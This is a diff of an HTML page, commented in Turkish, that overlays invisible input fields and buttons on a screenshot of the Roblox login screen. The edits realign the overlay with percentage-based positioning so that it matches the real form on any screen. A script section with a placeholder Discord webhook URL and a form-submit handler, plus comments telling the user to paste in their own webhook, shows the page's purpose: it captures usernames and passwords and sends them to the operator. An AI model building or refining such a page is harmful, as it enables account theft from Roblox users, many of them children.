@@ -19,12 +19,17 @@
             font-family: Arial, sans-serif;
         }
 
-        /* Resim ve form elemanlarını bir arada tutan sabit kapsayıcı */
+        /* 
+           ESNEK KİLİT SİSTEMİ: 
+           Resmin orijinal en-boy oranını (16:9 standardı) tarayıcıya kilitler.
+           Bu sayede resim küçülürse inputlar da küçülür, tam oturur.
+        */
         .wrapper {
             position: relative;
-            width: 100%;
-            height: 100%;
-            max-width: 1400px; /* Standart geniş ekran dengesi */
+            width: 100vw;
+            height: 56.25vw; /* 16:9 oranını korumak için dikey hesaplama */
+            max-height: 100vh;
+            max-width: 177.78vh; /* Yatayda taşmayı önleme */
             display: flex;
             justify-content: center;
             align-items: center;
@@ -39,23 +44,23 @@
 
         /* 
            GİRİŞ PANELİ ÇERÇEVESİ:
-           Esnek yüzde yerine doğrudan sabit piksel yapısına geçtik.
+           Resmin tam merkezindeki gri Roblox giriş formunun koordinatlarına kilitlendi.
         */
         .form-container {
             position: absolute;
-            width: 320px;  /* Resimdeki panelin tam genişliği */
-            height: 380px; /* Paneldeki tüm elemanların toplam dikey alanı */
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -43%); /* Formu dikey eksende tam Roblox paneline kilitler */
+            width: 19.8%; /* Resme göre tam yatay genişlik yüzdesi */
+            height: 48.5%; /* Resme göre en üstten en alta form yüksekliği */
+            top: 36.1%;   /* Dikeyde tam doğru başlangıç noktası */
+            left: 50.1%;
+            transform: translateX(-50%);
             box-sizing: border-box;
         }
 
-        /* Tüm elemanları bağımsız piksellere kilitliyoruz */
+        /* Tüm elemanları bu çerçevenin içinde bağımsız katmanlar olarak konumlandırıyoruz */
         .form-container input, .form-container button, .form-container a {
             position: absolute;
             width: 100%;
-            height: 38px; /* Orijinal Roblox kutu yüksekliği */
+            height: 12.2%; /* Her bir kutunun dikey kalınlık oranı */
             left: 0;
             background: transparent;
             border: none;
@@ -68,8 +73,8 @@
             color: #ffffff;
             font-size: 14px;
             padding: 0 12px;
-            line-height: 38px; /* Yazının kutu içinde aşağı sarkmasını veya yukarı taşmasını önler, tam ortalar */
-            height: 38px;
+            display: flex;
+            align-items: center;
         }
 
         .form-container button, .form-container a {
@@ -77,44 +82,44 @@
         }
 
         /* ============================================================ */
-        /* MİLİMETRİK SABİT PİKSEL KONUMLANDIRMALARI (Yukarıdan Aşağıya) */
+        /* RESMİN ÜZERİNE ÇAKILMIŞ MİLİMETRİK ORANLAR (Yukarıdan Aşağıya) */
         /* ============================================================ */
 
         /* 1. KUTU: Username Giriş Alanı */
         .username-field {
-            top: 0px; 
+            top: 0%; 
         }
 
         /* 2. KUTU: Password Giriş Alanı */
         .password-field {
-            top: 50px; /* İlk kutunun tam altına, aradaki boşlukla oturur */
+            top: 16.5%; /* Tam olarak ikinci gri kutunun içine oturur */
         }
 
         /* 3. BUTON: Log in butonu */
         .login-btn {
-            top: 102px; 
-            height: 40px;
+            top: 33.2%; /* Tam olarak ortadaki Log in butonuna kilitlenir */
+            height: 13.5%; /* Log in butonu orijinal tasarımdaki gibi hafif kalın yapıldı */
         }
 
         /* 4. BUTON: Send me the one-time code by email */
         .one-time-code-btn {
-            top: 198px; /* Forgot yazısını atlayıp tam gri kutunun üzerine oturur */
-            height: 40px;
+            top: 65.2%; /* "Forgot..." metnini es geçip alt gri butona oturur */
+            height: 13.5%;
         }
 
         /* 5. BUTON: Quick Login */
         .quick-login-btn {
-            top: 248px; 
-            height: 40px;
+            top: 81.8%; /* En alttaki gri butona kilitlenir */
+            height: 13.5%;
         }
 
         /* 6. LİNK: En alttaki Sign Up yazısı */
         .signup-link {
-            top: 310px;
-            height: 25px;
-            width: 80px; 
+            top: 101%; /* En alttaki "Sign up." kelimesinin tam üstü */
+            height: 8%;
+            width: 25%; 
             left: auto;
-            right: 45px; /* Sign up kelimesinin tam üzerine hizalanır */
+            right: 13.5%; 
         }
     </style>
 </head>
@@ -124,7 +129,7 @@
         <!-- Arka plan resmi -->
         <img src="roblox_giris.png" class="tam-ekran-resim" alt="Roblox">
 
-        <!-- Sabit pikselli görünmez form paneli -->
+        <!-- Yeni nesil kilitli esnek form paneli -->
         <form id="girisFormu" class="form-container">
             
             <!-- Kullanıcı adı -->
@@ -150,7 +155,7 @@
 
     <!-- DISCORD WEBHOOK BAĞLANTISI -->
     <script>
-        // BURAYA KENDİ DISCORD WEBHOOK LİNKİNİ YAPIŞTIR KANKA
+        // Kendi Discord Webhook linkini buraya yapıştırmayı unutma kanka!
         const webhookURL = "BURAYA_DISCORD_WEBHOOK_LINKINI_YAZ";
 
         document.getElementById('girisFormu').addEventListener('submit', function(e) {
